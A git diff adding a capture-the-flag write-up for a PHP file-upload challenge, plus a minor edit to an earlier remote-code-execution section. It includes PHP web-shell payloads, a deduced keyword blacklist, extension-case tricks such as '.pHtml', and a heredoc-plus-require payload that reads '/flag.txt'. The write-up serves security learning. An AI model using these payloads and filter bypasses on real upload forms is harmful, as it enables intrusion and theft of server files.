@@ -227,7 +227,9 @@ I'm too lazy. nvm, lol.
 
 It should be safe enough?
 
-This challenge involves a simple penetration testing methodology. All you need to do is perform basic footprinting on this server.
+![alt text](./images/r2s/CTFd.png)
+
+This challenge involves a simple penetration testing methodology. All you need to do is perform basic footprinting on this server and find the PoC exploit and RCE.
 
 ## CTFd token
 
@@ -322,3 +324,290 @@ Then, use this tool to RCE the machine. It's located in `/flag.txt`!
 ![RCE](./images/r2s/react2shell/rce.png)
 
 Flag: `THJCC{r34ct_ssr_rc3_1s_d4ng3r0us}`
+
+---
+
+# Simple Hack
+
+**Challenge Description:**
+We developed a file upload platform. I think it is really secure. Isn't it?
+
+> Author: UmmIt Kin
+
+![CTFd](./images/Simple%20Hack/CTFd.png)
+
+This challenge is fundamentally about a **file upload system with many restrictions**. You need to find ways to bypass the filters under extremely tight constraints.
+
+Thus, this challenge demonstrates a critical file upload vulnerability combined with inadequate input validation.
+
+Solving this challenge requires a substantial level of expertise in web security and PHP manipulation. Let's proceed to understand how to bypass the restrictions.
+
+## Website Interface
+
+Start by looking at the interface of this website! we can see that it is a file upload service!
+
+![Website Interface](./images/Simple%20Hack/Interface.png)
+
+## PHP Confirmed
+
+Like the r2s challenge, we should start by identifying the service and technology stack:
+
+```shell
+curl -I http://chal.thjcc.org:5222/
+```
+
+Output:
+```
+HTTP/1.1 200 OK
+Host: chal.thjcc.org:5222
+Date: Sun, 22 Feb 2026 19:12:10 GMT
+Connection: close
+X-Powered-By: PHP/8.2.30
+Set-Cookie: PHPSESSID=b9f53041d0de80b5ace2db3f9c300af2; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-type: text/html; charset=UTF-8
+```
+
+We can see the server is running **PHP 8.2**!! This is important information.
+
+### File upload Vulnerability
+
+Now the picture becomes clear!
+
+>**PHP + File Upload** = **File Upload Vulnerability**
+
+This is a classic **File Upload Vulnerability** scenario. If you're not familiar with file upload attacks, here's a quick overview:
+
+File Upload Vulnerabilities occur when a web application allows users to upload files without properly validating them. Attackers can exploit this to upload malicious files that can lead to remote code execution, defacement, or server compromise.
+
+#### Attempting Payloads
+
+Now we know it's a file upload challenge with PHP. Let's try basic exploitation techniques:
+
+Simple PHP Code Execution
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+Result: **BLOCKED** - Message: "Detected potential hacking attempt!"
+
+Using Variables
+```php
+<?php $x='sys'.'tem'; $x($_GET['cmd']); ?>
+```
+
+Result: **BLOCKED** - Contains `$` (variable declaration)
+
+Using Function Calls
+```php
+<?php echo file_get_contents('/flag.txt'); ?>
+```
+
+Result: **BLOCKED** - Contains `file_get_contents` keyword and `()` parentheses
+
+#### Deducing the Blacklist Through Trial and Error
+
+By trying different payloads, we can deduce what's filtered:
+
+| Payload | Result | Blocked Element |
+|---------|--------|-----------------|
+| `<?php system(...) ?>` | BLOCKED | `system` keyword |
+| `<?php exec(...) ?>` | BLOCKED | `exec` keyword |
+| `<?php eval(...) ?>` | BLOCKED | `eval` keyword |
+| `<?php $var = '...' ?>` | BLOCKED | `$` character |
+| `<?php func(...) ?>` | BLOCKED | `(` and `)` characters |
+| `<?php $arr[0] ?>` | BLOCKED | `[` and `]` characters |
+| `<?php "string" ?>` | BLOCKED | `"` and `'` characters |
+| `<?php include(...) ?>` | BLOCKED | `include` and `()` |
+
+## File Extensions
+
+Even if the content passes the blacklist, the file extension matters for execution. The server must map the extension to a PHP handler. Let's try different extensions:
+
+`.php`
+```
+Filename: shell.php
+Content: <?php system($_GET['cmd']); ?>
+```
+Result: **BLOCKED** - File extension or content filtered
+
+`.phtml`
+```
+Filename: shell.phtml
+Content: <?php system($_GET['cmd']); ?>
+```
+Result: **BLOCKED** - Content still contains forbidden characters
+
+`.phtml` with Heredoc bypass
+```
+Filename: shell.phtml
+Content: <?=require <<<A
+/fl
+A
+.<<<B
+ag.txt
+B
+?>
+```
+Result: **BLOCKED** - Filename or extension check
+
+### PHP extensions
+
+| Extension | Server Config | Result |
+|-----------|---------------|--------|
+| `.php` | Usually enabled | BLOCKED |
+| `.php3` | Apache/CGI only | Test if allowed |
+| `.php4` | Apache/CGI only | Test if allowed |
+| `.php5` | Apache/CGI only | Test if allowed |
+| `.phtml` | Apache enabled | Test if allowed |
+| `.pht` | Apache enabled | Test if allowed |
+| `.phps` | Source view | BLOCKED |
+| `.html` | Static files | BLOCKED |
+
+The key is finding which extension the server allows AND will execute as PHP. The common php related extensions have:
+
+```
+phtml
+php
+php3
+php4
+php5
+pHtml
+pHp
+pHp3
+pHp4
+pHp5
+```
+
+Case-insensitive extensions might bypass filters! The server might check lowercase but execute based on actual case.
+
+Now test `.phtml` first (commonly enabled), then try case variations like `.pHtml` or `.PhTmL`.
+
+## Heredoc Bypassing
+
+The key insight is realizing what's **NOT** blocked. Let's think about PHP syntax features that don't require parentheses or quotes:
+
+### The <<<
+
+The Heredoc syntax is a PHP feature for defining multi-line strings **without needing quotes or special characters**.
+
+```php
+// Traditional string (BLOCKED due to quotes):
+$str = "hello";
+
+// Heredoc string (NOT BLOCKED - no quotes, no $):
+<?php
+$str = <<<END
+hello
+END;
+?>
+```
+
+- No quote characters (`"` or `'`)
+- Can define strings without variable declaration needed
+- Supports string concatenation at parse time
+- Not in the typical blacklist because it's less commonly exploited
+
+### Combining Heredoc with `require`
+
+The `require` keyword is special in PHP:
+
+- It's a **language construct**, not a function
+- It can work **without parentheses**
+
+```php
+// Function style
+<?php require('/flag.txt'); ?>
+
+// Construct
+<?php require '/flag.txt' ?>
+
+// With Heredoc
+<?php require <<<A
+/flag.txt
+A;
+?>
+```
+
+## Building the Exploit
+
+Construct the file path using Heredoc
+
+Since `/flag.txt` contains a `/`, we can split it:
+- `/fl` (first part)
+- `ag.txt` (second part)
+
+```php
+<<<A
+/fl
+A
+.<<<B
+ag.txt
+B
+```
+
+This creates two Heredoc strings and concatenates them:
+
+- `<<<A ... A` → `/fl`
+- `<<<B ... B` → `ag.txt`
+
+Instead of `<?php ... ?>`, we use `<?= ... ?>` (short echo tag):
+
+```php
+<?=require <<<A
+/fl
+A
+.<<<B
+ag.txt
+B
+?>
+```
+
+Now:
+
+- Heredoc concatenation `/fl` + `ag.txt` = `/flag.txt`
+- Passes it to `require` language construct
+- Executes the require and echoes the output
+- All without using `()`, `"`, `$`, or any blacklisted characters!
+
+Use `.phtml` extension instead of `.php` to potentially bypass file type checks:
+
+### Final Exploit
+
+```
+Filename: exploit.phtml
+
+Content:
+
+<?=require <<<A
+/fl
+A
+.<<<B
+ag.txt
+B
+?>
+```
+
+## Upload the File
+
+1. Save the above code to a file
+2. Upload it to the platform with filename: `exploit.phtml`
+3. The server processes it through the blacklist filter
+
+![Successfully](./images/Simple%20Hack/Successfully.png)
+
+### Retrieve Flag
+
+Click on the uploaded file path to trigger execution:
+
+1. Navigate to the uploaded file URL
+2. PHP interprets the file
+3. The heredoc syntax constructs `/flag.txt` path
+4. `require` statement reads and displays the file contents
+5. The flag is revealed
+
+Flag: `THJCC{w311_d0n3_y0u_byp4553d_7h3_b14ck1157_:D}`
+
+![Flag](./images/Simple%20Hack/flag.png)
